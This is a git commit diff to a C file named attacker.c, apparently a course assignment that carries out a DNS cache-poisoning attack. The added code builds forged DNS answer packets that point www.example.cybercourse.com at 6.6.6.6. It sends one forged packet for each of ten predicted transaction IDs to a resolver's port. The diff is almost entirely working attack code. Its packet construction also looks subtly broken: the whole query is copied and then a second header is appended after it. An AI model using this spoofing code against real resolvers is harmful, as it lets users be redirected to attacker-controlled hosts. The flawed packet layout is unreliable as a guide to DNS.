2c4eac8dc981ca69c25cefda06eca313f4b7e336
YousefAGO <97043151+YousefAGO@users.noreply.github.com>
2025-01-14 15:33:58 +0200

    Update attacker.c

--- attacker.c
+++ attacker.c
@@ -14,6 +14,102 @@
 
 int build_dns_query(unsigned char *buffer, const char *hostname);
 
+// Structure for DNS header and response construction
+int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid, const char *hostname) {
+    int response_len = 0;
+
+    // DNS Header (same as the query but with a different txid and response flags)
+    uint32_t txid_network = htons(txid); 
+    unsigned short flags = htons(0x8180);  // Standard query response, no error
+    unsigned short q_count = htons(1);     // 1 question
+    unsigned short ans_count = htons(1);   // 1 answer
+    unsigned short auth_count = 0;
+    unsigned short add_count = 0;
+
+    // Copy the query into the buffer
+    memcpy(buffer, query, query_len);
+    response_len = query_len;
+
+    // Header section for response
+    memcpy(buffer + response_len, &txid_network, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &flags, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &q_count, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &ans_count, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &auth_count, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &add_count, 2);
+    response_len += 2;
+
+    // Copy the question section as is (hostname format and type)
+    // This is the same question section as in the query, no changes
+    memcpy(buffer + response_len, query + 12, query_len - 12);
+    response_len += query_len - 12;
+
+    // Answer section: Hostname -> A record (IP: 6.6.6.6)
+    unsigned short type = htons(1);  // Type A (IPv4 address)
+    unsigned short _class = htons(1); // Class IN (Internet)
+    unsigned int ttl = htonl(300);    // Time-to-live: 300 seconds
+    unsigned short data_len = htons(4); // Length of the IP address
+
+    // A record data (IP address 6.6.6.6)
+    unsigned char ip_address[] = { 6, 6, 6, 6 };
+
+    // Write answer
+    memcpy(buffer + response_len, &type, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &_class, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, &ttl, 4);
+    response_len += 4;
+    memcpy(buffer + response_len, &data_len, 2);
+    response_len += 2;
+    memcpy(buffer + response_len, ip_address, 4);
+    response_len += 4;
+
+    return response_len;
+}
+
+// Function to send the spoofed DNS response
+void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    unsigned char buffer[BUFFER_SIZE];
+
+    // Step 1: Create a UDP socket
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Step 2: Configure the server address for sending the spoofed response
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(destination_port);
+    inet_pton(AF_INET, destination_ip, &server_addr.sin_addr);
+
+    // Step 3: Assume we already have the DNS query (this would normally come from the client)
+    unsigned char query[BUFFER_SIZE];
+    int query_len = build_dns_query(query, hostname);  
+
+    // Step 4: Build the DNS response
+    int response_len = build_dns_response(buffer, query, query_len, txid, hostname);
+
+    // Step 5: Send the spoofed DNS response
+    if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("Failed to send spoofed DNS response");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+    printf("Spoofed DNS response sent for hostname: %s with IP: 6.6.6.6\n", hostname);
+    close(sockfd);
+}
+
 // Function to fill the txid_ls with the 10 possible txid
 void fill_txids(uint32_t *txid_ls, uint32_t txid){
     // if the LSbit of r_1 = LSbit r_2 = 0 
@@ -31,7 +127,6 @@ void fill_txids(uint32_t *txid_ls, uint32_t txid){
     }
 }
     
-
 int socket_creation(struct sockaddr_in *server_addr){
     // Create a socket
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -122,7 +217,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        printf("txid_ls[%d] = %u\n", i, txid_ls[i]);
+        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port);
     }
     
     // Close the connection
